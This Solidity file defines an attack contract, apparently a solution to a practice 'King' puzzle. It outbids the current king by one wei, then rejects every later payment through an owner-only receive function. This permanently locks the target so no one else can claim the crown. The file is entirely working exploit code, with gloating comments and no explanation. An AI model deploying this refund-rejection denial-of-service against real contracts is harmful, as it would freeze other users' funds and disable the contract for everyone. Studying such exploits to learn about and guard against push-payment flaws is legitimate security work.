// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./king.sol";


contract AttackKing {
    King kingContract;
    address public owner;

    constructor(address payable kingContractAddress){
        kingContract = King(kingContractAddress);
        owner = msg.sender;
    }

    modifier isOwner() {
        require(msg.sender == owner);
        _;
    }

    /*
    we take the crown, with a little bit of increment
    */
    function attack() public isOwner {
        uint amount = kingContract.prize() + 1 wei;
        (bool success, ) = payable(address(kingContract)).call{value: amount}("");
        require(success);
    }

    /*
    we then prevent anyone from becoming the king
    by rejecting their payment :)
    honest king or foolish king :) xD
    */
    receive() external payable isOwner {}

}

